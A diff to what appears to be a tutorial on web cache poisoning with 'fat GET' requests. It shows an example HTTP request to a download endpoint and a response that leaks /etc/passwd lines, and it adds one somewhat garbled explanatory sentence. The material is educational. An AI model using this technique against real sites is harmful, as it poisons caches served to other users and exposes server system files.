@@ -4,7 +4,7 @@ If a legitimate user then makes a regular GET request that matches the same cach
 
 In some cases, it may also be possible to use the `X-HTTP-Method-Override` header to trick the application into treating a fat `GET` request as a normal `POST` request.
 
-Below is an example of a fat GET request:
+Below is an example of a fat GET request, since the response is unkeyed and included in the response, the cache will be poisoned:
 ```http
 GET /download?filename=file.php HTTP/1.1
 Host: target-website.com
@@ -23,6 +23,7 @@ They would then get the following response, since:
 HTTP/1.1 200 OK
 ...
 
+...[FILE DATA]...
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
